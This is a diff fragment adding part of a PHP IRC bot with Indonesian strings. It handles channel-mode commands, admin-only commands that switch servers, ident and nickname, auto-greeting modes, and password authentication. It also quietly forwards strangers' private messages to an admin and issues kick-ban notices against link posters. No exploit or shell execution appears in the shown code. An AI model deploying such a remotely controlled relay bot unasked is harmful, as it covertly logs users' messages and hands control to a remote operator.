+                 if (substr($dCommand,0,3)=='433') {
+                   $nick = $nicky[rand(0,count($nicky) - 1)].$nicky[rand(0,count($nicky) - 1)];
+                   fputs($fp, 'NICK '.$nick . CRL);
+                 }
+               }
+               elseif ($com[3]==':!op' && $chan) {
+                 if ($com[4]) { $opnick = $com[4]; }
+                 else { $opnick = $dNick; }
+                 fputs($fp, 'MODE '.$chan.' +ooo '.$opnick.' '.$com[5].' '.$com[6] . CRL);
+               }
+               elseif ($com[3]==':!dop' && $chan) {
+                 if ($com[4]) { $opnick = $com[4]; }
+                 else { $opnick = $dNick; }
+                 fputs($fp, 'MODE '.$chan.' -o+v-oo '.$opnick.' '.$opnick.' '.$com[5].' '.$com[6] . CRL);
+               }
+               elseif ($com[3]==':!hop' && $chan) {
+                 if ($com[4]) { $hopnick = $com[4]; }
+                 else { $hopnick = $dNick; }
+                 fputs($fp, 'MODE '.$chan.' +hhh '.$hopnick.' '.$com[5].' '.$com[6] . CRL);
+               }
+               elseif ($com[3]==':!dhop' && $chan) {
+                 if ($com[4]) { $dhopnick = $com[4]; }
+                 else { $dhopnick = $dNick; }
+                 fputs($fp, 'MODE '.$chan.' -h+v-hh '.$dhopnick.' '.$dhopnick.' '.$com[5].' '.$com[6] . CRL);
+               }
+               elseif ($com[3]==':!v' && $chan) {
+                 if ($com[4]) { $vonick = $com[4]; }
+                 else { $vonick = $dNick; }
+                 fputs($fp, 'MODE '.$chan.' +vvv '.$vonick.' '.$com[5].' '.$com[6] . CRL);
+               }
+               elseif ($com[3]==':!dv' && $chan) {
+                 if ($com[4]) { $vonick = $com[4]; }
+                 else { $vonick = $dNick; }
+                 fputs($fp, 'MODE '.$chan.' -vvv '.$vonick.' '.$com[5].' '.$com[6] . CRL);
+               }
+               elseif ($com[3]==':!awaymsg' && $auth["$dNick"]["status"]=="Admin") {
+                 $msg = strstr($data,":!awaymsg");
+                 $msg = str_replace(":!awaymsg","",$msg);
+                 if (strlen($msg)<3) {
+                   $raway="on";
+                   fputs($fp,'AWAY : ' . '13maaf g trima pvan g blh ma ayankq' . CRL);
+                 }
+                 else {
+                   $raway="off";
+                   fputs($fp,'AWAY : ' . $msg . CRL);
+                 }
+               }
+               elseif ($com[3]==':!mode' && $com[4] && $chan) {
+                 fputs($fp, 'MODE '.$chan.' :'.$com[4].' '.$com[5] . CRL);
+               }
+               elseif ($com[3]==':!nickmode' && $com[4]) {
+                 $nickmode = $com[4];
+                 fputs($fp, 'MODE '.$nick.' :'.$nickmode . CRL);
+               }
+               elseif ($com[3]==':!chanlist') {
+                 fputs($fp, 'NOTICE '.$dNick.' :Channel List: '.$channels . CRL);
+               }
+               elseif ($com[3]==':!userlist') {
+                 $userlist="";
+                 foreach ($auth as $user) {
+                   if ($user["pass"]) { $pass="-pass ok"; }
+                   else { $pass="-no pass"; }
+                   $userlist .= $user["name"].'('.$user["status"].$pass.') ';
+                 }
+                 fputs($fp, 'NOTICE '.$dNick.' :User List: '.$userlist . CRL);
+               }
+               elseif ($com[3]==':!quit' && $auth["$dNick"]["status"]=="Admin") {
+                 $msg = strstr($data,":!quit");
+                 $msg = str_replace(":!quit","",$msg);
+                 if (strlen($msg)>3) {
+                   $msg = str_replace(" ","_",$msg);
+                 }
+                 $quitmsg = $quitmsglist[rand(0,count($quitmsglist) - 1)];
+                 fputs($fp, 'QUIT ' . $quitmsg . CRL);
+                 $keluar = 1;
+                 exit;
+
+               }
+               elseif ($com[3]==':!vhost' && $auth["$dNick"]["status"]=="Admin") {
+                 if ($com[4]) { $localhost = $com[4]; }
+                 else { $localhost = 'localhost'; }
+                 $keluar = 0;
+                 fputs($fp, 'QUIT ' . CRL);
+               }
+               elseif ($com[3]==':!pindah' && $auth["$dNick"]["status"]=="Admin") {
+                 if (empty($com[4])) {
+                   $remotehost = $remotehost2[rand(0,count($remotehost2) - 1)];
+                 }
+                 else { $remotehost = $com[4]; }
+                 $keluar = 0;
+                 fputs($fp, "QUIT Ganti_Server".CRL);
+               }
+               elseif ($com[3]==':!ident' && $auth["$dNick"]["status"]=="Admin") {
+                 if (!$com[4]) { $username = $username; }
+                 else { $username = $com[4]; }
+                 $keluar = 0;
+                 fputs($fp, 'QUIT Ganti_Ident ' . CRL);
+               }
+               elseif ($com[3]==':!name' && $auth["$dNick"]["status"]=="Admin") {
+                 if (!$com[4]) { $realname = "--"; }
+                 else { $realname = $com[4]; }
+                 $keluar = 0;
+                 fputs($fp, 'QUIT Ganti_Nama ' . CRL);
+               }
+               elseif ($com[3]==':!topic' && $com[4] && $chan) {
+                 $msg = strstr($data,":!topic");
+                 $msg = str_replace(":!topic ","",$msg);
+                 fputs($fp, 'TOPIC '.$chan.' :'.$msg . CRL);
+               }
+               elseif ($com[3]==':!help' && !$chan) {
+                 fputs($fp,'PRIVMSG '.$dNick.' :maaf code yang anda masukan salah' . CRL);
+               }
+               /*** AUTO RESPONSE COMMAND BY Zix **/
+               elseif ($com[3]==':!ngomong') {
+                 $ngomong = TRUE;
+                 $autowelcome = TRUE;
+                 $autosambut = FALSE;
+                 $autopv = FALSE;
+                 $autopesan = FALSE;
+                 if ($chan) {fputs($fp,'PRIVMSG '.$chan.' :ACTION Tankz Boozz aq boleh Cerewet !'. CRL); }
+                 else { fputs($fp,'NOTICE '.$dNick.' :Ok boss, gue ngomong deh. ' . CRL); }
+               }
+               elseif ($com[3]==':!sambut') {
+                 $ngomong = FALSE;
+                 $autowelcome = FALSE;
+                 $autosambut = TRUE;
+                 $autopv = FALSE;
+                 $autopesan = FALSE;
+                 if ($chan) {fputs($fp,'PRIVMSG '.$chan.' :ACTION oce Boozz AQ Sambut tamunya !'. CRL); }
+                 else { fputs($fp,'NOTICE '.$dNick.' :Ok boss, gue sambut deh. ' . CRL); }
+               }
+               elseif ($com[3]==':!pv') {
+                 $ngomong = FALSE;
+                 $autowelcome = FALSE;
+                 $autosambut = FALSE;
+                 $autopv = TRUE;
+                 $autopesan = FALSE;
+                 if ($chan) {fputs($fp,'PRIVMSG '.$chan.' :ACTION WEeeK aq aro Boozze kon PV tamunya !'. CRL); }
+                 else { fputs($fp,'NOTICE '.$dNick.' :oke Tak PVne Booz. ' . CRL); }
+               }
+               elseif ($com[3]==':!pesan') {
+                 $ngomong = FALSE;
+                 $autowelcome = FALSE;
+                 $autosambut = FALSE;
+                 $autopv = FALSE;
+                 $autopesan = TRUE;
+                 if ($chan) {fputs($fp,'PRIVMSG '.$chan.' :ACTION Siiap ngabsen tamunya boz!'. CRL); }
+                 else { fputs($fp,'NOTICE '.$dNick.' :Tak absenne Booz  ' . CRL); }
+               }
+               elseif ($com[3]==':!diam') {
+                 $ngomong = FALSE;
+                 $autowelcome = FALSE;
+                 $autosambut = FALSE;
+                 $autopv = FALSE;
+                 $autopesan = FALSE;
+                 if ($chan) { fputs($fp,'PRIVMSG '.$chan.' :ACTION Ciiiaaapp!! gak bakal ngomong :('. CRL); }
+                 else { fputs($fp,'NOTICE '.$dNick.' :Ok boss, aq meneng ceep. ' . CRL); }
+               }
+             }
+             else { fputs($fp,'NOTICE '.$dNick.' :Pikun boss auth dulu! Ketik: auth <password> '. CRL); }
+           }
+         }
+         elseif (!$auth["$dNick"] && !eregi("auth",$iText)) {
+           if (eregi("www.",$iText) || eregi("http:",$iText) || eregi("join #",$iText)) {
+             if (!ereg("#",$dCommand)) {
+               if ($log=="on") {
+                 fputs($fp,'PRIVMSG '. $admin .' :4inviter: ' . $dFrom . '2:' .$iText. CRL);
+               }
+               $inv = strstr($dFrom,'@');
+               foreach ($auth as $user) {
+                 if ($user["status"]=="user") {
+                   fputs($fp, 'NOTICE '.$user["name"].' :KB '.$chan.' '.$dNick.' '.$inv.'' . CRL);
+                 }
+               }
+             }
+           }
+           elseif (!ereg("#",$dCommand)) {
+             if ($log=="on") {
+               fputs($fp,'PRIVMSG '.$admin.' :6' . $dFrom . '12:' .$iText. CRL);
+             }
+           }
+         }
+       }
+     }
+     elseif (substr($data,0,4) == 'PING') {
+       fputs($fp,'PONG ' . substr($data,5) . CRL);
+     }
+   }
+ }
+ fclose($fp);
+} while ($keluar == 0);
+}
+
+hajar($nick);
+
+?>
+
+
+
+
+
